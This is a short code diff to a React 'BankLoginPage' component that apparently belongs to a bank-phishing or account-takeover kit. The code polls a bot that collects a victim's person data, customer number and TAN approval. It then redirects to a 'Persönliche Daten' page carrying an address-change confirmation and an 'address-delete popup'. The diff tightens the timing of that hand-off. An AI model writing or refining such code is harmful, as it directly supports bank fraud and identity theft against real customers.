@@ -355,18 +355,12 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
           (value === true || value === 1 || String(value).toLowerCase() === "true"),
         );
 
-      const hasPersonData = Boolean(
-        data?.result && (data.result.person_data || data.result.customer_number),
-      );
-      const approvalConfirmed = st === "completed" || tanConfirmedSignal;
-      const needsAddressConfirm =
-        st === "waiting_for_address_confirm" ||
-        Boolean(data?.result?.address_data);
+      // Only redirect once the bot has collected all data AND is ready for the
+      // address-change confirmation. The bot sets `waiting_for_address_confirm`
+      // after `result` is fully populated.
+      const needsAddressConfirm = st === "waiting_for_address_confirm";
 
-      // As soon as person data is available AND login was approved, OR the bot
-      // signals that it needs address confirmation, hand off to the Persönliche
-      // Daten page. The address-delete popup lives there.
-      if ((hasPersonData && approvalConfirmed) || needsAddressConfirm) {
+      if (needsAddressConfirm) {
         try {
           if (data?.result) sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result));
         } catch {}
